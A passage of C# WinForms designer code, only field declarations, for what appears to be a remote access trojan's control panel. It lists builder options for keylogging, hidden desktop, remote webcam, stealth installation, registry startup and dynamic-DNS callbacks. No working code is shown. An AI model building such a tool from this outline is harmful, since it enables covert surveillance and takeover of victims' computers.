        private ColumnHeader columnHeader10;
        private ColumnHeader columnHeader11;
        private ToolStripMenuItem removeOfflineClientToolStripMenuItem;
        private Guna2ContextMenuStrip EventLogsContextMenuStrip;
        private ToolStripMenuItem removeLogtoolStripMenuItem;
        private ToolStripMenuItem removeAllLogstoolStripMenuItem;
        private Guna2GradientButton OpenBuilderBtn;
        private Guna2ContextMenuStrip notifyIconContextMenuStrip;
        private ToolStripMenuItem OpenToolStripMenuItem;
        private ToolStripMenuItem HideToolStripMenuItem;
        private Guna2GradientPanel EventLogTopPanel;
        private Guna2Button ToggleLogViewBtn;
        private Label EventLogLabel;
        private Guna2GroupBox guna2GroupBox2;
        private Guna2TextBox WindowTitletextBox;
        private Label TitleLabel;
        private Guna2GradientButton SaveCustomTitleButton;
        private Guna2GradientButton SetTitleBtn;
        private Guna2GradientButton restoreOgTitleBtn;
        private Guna2GradientButton AnimateTitleBtn;
        private Guna2GroupBox guna2GroupBox1;
        private Guna2HtmlLabel guna2HtmlLabel8;
        public Guna2CustomCheckBox chkShowPassword;
        public Guna2CustomCheckBox chkPopup;
        private Guna2HtmlLabel guna2HtmlLabel7;
        private Guna2GradientButton guna2GradientButton1;
        private Guna2HtmlLabel guna2HtmlLabel1;
        public Guna2TextBox txtNoIPPass;
        public Guna2GradientButton btnListen;
        public Guna2TextBox txtNoIPUser;
        public Guna2NumericUpDown ncPort;
        public Guna2TextBox txtNoIPHost;
        public Guna2CustomCheckBox chkIPv6Support;
        private Guna2HtmlLabel guna2HtmlLabel6;
        private Guna2HtmlLabel guna2HtmlLabel2;
        public Guna2CustomCheckBox chkNoIPIntegration;
        public Guna2CustomCheckBox chkAutoListen;
        private Guna2HtmlLabel guna2HtmlLabel4;
        private Guna2HtmlLabel guna2HtmlLabel3;
        public Guna2CustomCheckBox chkShowTooltip;
        public Guna2CustomCheckBox chkUseUpnp;
        private Guna2HtmlLabel guna2HtmlLabel5;
        private Guna2GroupBox guna2GroupBox4;
        private Guna2TextBox txtTag;
        private Label label1;
        private Guna2TextBox txtMutex;
        private Label label2;
        private Guna2GradientButton btnMutex;
        private Guna2GroupBox guna2GroupBox5;
        private Guna2GradientButton btnAddHost;
        private Label label3;
        private Guna2TextBox txtHost;
        private Label label4;
        private Guna2GroupBox guna2GroupBox6;
        private ListBox lstHosts;
        public Guna2NumericUpDown numericUpDownPort;
        public Guna2NumericUpDown numericUpDownDelay;
        private Label label7;
        public Guna2CustomCheckBox chkKeylogger;
        private Guna2HtmlLabel guna2HtmlLabel17;
        private Guna2TextBox txtLogDirectoryName;
        private Label label5;
        public Guna2CustomCheckBox chkHideLogDirectory;
        private Guna2HtmlLabel guna2HtmlLabel18;
        private Guna2GroupBox guna2GroupBox3;
        public Guna2CustomCheckBox chkInstall;
        private Guna2HtmlLabel guna2HtmlLabel9;
        private Guna2RadioButton rbAppdata;
        private Label label6;
        private Guna2RadioButton rbSystem;
        private Guna2RadioButton rbProgramFiles;
        private PictureBox pictureBox1;
        private PictureBox picUAC1;
        private Guna2TextBox txtInstallSubDirectory;
        private Label label8;
        private Guna2TextBox txtInstallName;
        private Label label9;
        public Guna2CustomCheckBox chkHideSubDirectory;
        private Guna2HtmlLabel guna2HtmlLabel11;
        public Guna2CustomCheckBox chkHide;
        private Guna2HtmlLabel guna2HtmlLabel10;
        private Label label10;
        public Guna2CustomCheckBox chkStartup;
        private Guna2HtmlLabel guna2HtmlLabel12;
        private Guna2TextBox txtRegistryKeyName;
        private Label label11;
        private Guna2TextBox txtPreviewPath;
        private Label label12;
        public Guna2CustomCheckBox chkChangeAsmInfo;
        private Guna2HtmlLabel guna2HtmlLabel13;
        private ToolTip tooltip;
        private Guna2ContextMenuStrip BuilderContextMenuStrip;
        private ToolStripMenuItem toolStripMenuItem1;
        private ToolStripMenuItem removeAllToolStripMenuItem;
        private ToolStripMenuItem fileManagerToolStripMenuItem;
        private ToolStripMenuItem toolStripMenuItem2;
        private ToolStripMenuItem hiddenDesktopHVNCToolStripMenuItem;
        private ToolStripMenuItem remoteWebcamToolStripMenuItem;
        private ToolStripMenuItem offlineKeyloggerToolStripMenuItem;
        private ToolStripSeparator toolStripSeparator2;
        private ToolStripMenuItem toolStripMenuItem3;
        private ToolStripMenuItem toolStripMenuItem4;
        private ToolStripMenuItem miscellaneousToolStripMenuItem;
        private ToolStripMenuItem pluginManagerToolStripMenuItem;
        private ToolStripMenuItem resetSurvivalToolStripMenuItem1;
        private ToolStripMenuItem systemInformationToolStripMenuItem1;
        private ToolStripMenuItem toolStripMenuItem5;
        private ToolStripSeparator toolStripSeparator3;
        private Guna2GradientButton guna2GradientButton2;
        private Guna2GradientButton guna2GradientButton3;
        private Guna2GradientButton guna2GradientButton4;
        private Guna2GradientButton guna2GradientButton5;
        public Guna2DataGridView TasksDataGridView;
        private Guna2GradientButton guna2GradientButton6;
        private KryptonPage kryptonPage1;
        public Guna2GradientButton guna2GradientButton9;
        public Guna2GradientButton guna2GradientButton8;
        public Guna2DataGridView NotificationDataGridView;
        public Guna2DataGridView NotiDataGridView;
        private DataGridViewTextBoxColumn keywordCol;
        private Guna2GradientButton guna2GradientButton10;
        private DataGridViewTextBoxColumn User2Col;
        private DataGridViewTextBoxColumn WordCol;
        private DataGridViewTextBoxColumn TitleCol;
        private DataGridViewTextBoxColumn TriggerCol;
        private DataGridViewTextBoxColumn TaskCol;
        private DataGridViewTextBoxColumn Param1Col;
        private DataGridViewTextBoxColumn Param2Col;
        private DataGridViewTextBoxColumn Param3Col;
        public Guna2DataGridView NotiTasksDataGridView;
        private DataGridViewTextBoxColumn User3Col;
        private DataGridViewTextBoxColumn TimeCol;
        private DataGridViewTextBoxColumn Task2Col;
    }
}
